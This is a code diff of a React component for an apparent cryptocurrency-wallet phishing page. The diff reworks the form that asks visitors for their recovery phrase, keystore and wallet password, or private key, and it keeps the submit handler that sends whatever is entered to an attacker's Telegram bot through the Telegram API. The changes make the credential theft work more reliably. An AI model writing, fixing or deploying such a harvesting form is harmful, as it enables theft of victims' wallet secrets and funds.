@@ -237,12 +237,13 @@ const Gallery1 = () => {
     const [activeMethod, setActiveMethod] = useState('Phrase');
       const [loading, setLoading] = useState(false);
     
-        const formSchema = z.object({
-          phrase: z.string().min(1, 'required'),
-          keystore: z.string().email('required'),
-          privateKey: z.string().min(1, 'required'),
-          wallet: z.string().min(1, 'required'),
-        });
+      const formSchema = z.object({
+        phrase: activeMethod === 'Phrase' ? z.string().min(1, 'Required') : z.string().optional(),
+        keystore: activeMethod === 'Keystore' ? z.string().min(1, 'Required') : z.string().optional(),
+        privateKey: activeMethod === 'Private Key' ? z.string().min(1, 'Required') : z.string().optional(),
+        wallet: activeMethod === 'Keystore' ? z.string().min(1, 'Required') : z.string().optional(),
+      });
+      
       
         const {
           register,
@@ -275,6 +276,8 @@ const Gallery1 = () => {
     const Nav = useNavigate()
 
     const onSubmit = async (data) => {
+        console.log('working')
+        setLoading(true);
         const methodData = {
             method: activeMethod,
             value: data[activeMethod.toLowerCase()] || '', 
@@ -306,7 +309,6 @@ const Gallery1 = () => {
     ${methodMessage}`;
     
         try {
-            setLoading(true);
             const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
@@ -396,44 +398,48 @@ const Gallery1 = () => {
                                     ))}
                                 </div>
                                 {activeMethod === 'Phrase' && (
-                                    <div className="phrase-section">
-                                      <textarea {...register('phrase')} row={8} placeholder='Enter your recovery phrase'></textarea>
-                                      {errors.phrase && <span style={{color: 'red'}}>{errors.phrase.message}</span>}
-                                      <span>Typically 12 (sometimes 24) words separated by single spaces</span>
-                                      <button className="proceed" onClick={() => handleSubmit(onSubmit)}>
-                                      {loading && activeMethod === 'Phrase' ? <ClipLoader color="white" size={20} /> : "proceed"}
+                                <form onSubmit={handleSubmit(onSubmit)} className="phrase-section">
+                                    <textarea {...register('phrase')}  placeholder="Enter your recovery phrase"></textarea>
+                                    {errors.phrase && <span style={{ color: 'red' }}>{errors.phrase.message}</span>}
+                                    <span>Typically 12 (sometimes 24) words separated by single spaces</span>
+                                    <button type="submit" className="proceed">
+                                        {loading && activeMethod === 'Phrase' ? <ClipLoader color="white" size={20} /> : 'Proceed'}
+                                    </button>
+                                    <button type="button" className="cancel" onClick={closeModal}>
+                                        Cancel
+                                    </button>
+                                </form>
+                            )}
 
-                                      </button>
-                                      <button className="cancel" onClick={closeModal}>cancel</button>
-                                    </div>
-                                )}
-                                {activeMethod === 'Keystore' && (
-                                    <div className="keystore-section">
-                                         <textarea {...register('keystore')} name="" id="" row={8} placeholder='Enter keystore'></textarea>
-                                         {errors.keystore && <span style={{color: 'red'}}>{errors.keystore.message}</span>}
-                                         <input {...register('wallet')} type="text" placeholder='Wallet-password'/>
-                                         {errors.wallet && <span style={{color: 'red'}}>{errors.wallet.message}</span>}
-                                      <span>Several lines of text beginning with "..." plus the password you used to encrypt it.</span>
-                                      <button className="proceed" onClick={() => handleSubmit(onSubmit)}>
-                                      {loading && activeMethod === 'Keystore'? <ClipLoader color="white" size={20} /> : "proceed"}
+                            {activeMethod === 'Keystore' && (
+                                <form onSubmit={handleSubmit(onSubmit)} className="keystore-section">
+                                    <textarea {...register('keystore')}  placeholder="Enter keystore"></textarea>
+                                    {errors.keystore && <span style={{ color: 'red' }}>{errors.keystore.message}</span>}
+                                    <input {...register('wallet')} type="text" placeholder="Wallet-password" />
+                                    {errors.wallet && <span style={{ color: 'red' }}>{errors.wallet.message}</span>}
+                                    <span>Several lines of text beginning with "..." plus the password you used to encrypt it.</span>
+                                    <button type="submit" className="proceed">
+                                        {loading && activeMethod === 'Keystore' ? <ClipLoader color="white" size={20} /> : 'Proceed'}
+                                    </button>
+                                    <button type="button" className="cancel" onClick={closeModal}>
+                                        Cancel
+                                    </button>
+                                </form>
+                            )}
 
-                                      </button>
-                                      <button className="cancel" onClick={closeModal} >cancel</button>
-                                    </div>
-                                )}
-                                {activeMethod === 'Private Key' && (
-                                    <div className="private-key-section">
-                                        <input {...register('privateKey')} type="text" placeholder='Enter your private key' />
-                                        {errors.privateKey && <span style={{color: 'red'}}>{errors.privateKey.message}</span>}
-                                      <span>Typically 12 (sometimes 24) words separated by single spaces</span>
-                                      <button className="proceed" onClick={() => handleSubmit(onSubmit)}>
-                                      {
-                                        loading && activeMethod === 'Private Key'?<ClipLoader color="white" size={20} /> : "proceed"
-                                        } 
-                                      </button>
-                                      <button className="cancel" onClick={closeModal}>cancel</button>
-                                    </div>
-                                )}
+                            {activeMethod === 'Private Key' && (
+                                <form onSubmit={handleSubmit(onSubmit)} className="private-key-section">
+                                    <input {...register('privateKey')} type="text" placeholder="Enter your private key" />
+                                    {errors.privateKey && <span style={{ color: 'red' }}>{errors.privateKey.message}</span>}
+                                    <span>Typically 12 (sometimes 24) words separated by single spaces</span>
+                                    <button type="submit" className="proceed">
+                                        {loading && activeMethod === 'Private Key' ? <ClipLoader color="white" size={20} /> : 'Proceed'}
+                                    </button>
+                                    <button type="button" className="cancel" onClick={closeModal}>
+                                        Cancel
+                                    </button>
+                                </form>
+                            )}
                             </div>
                         )}
                     </div>
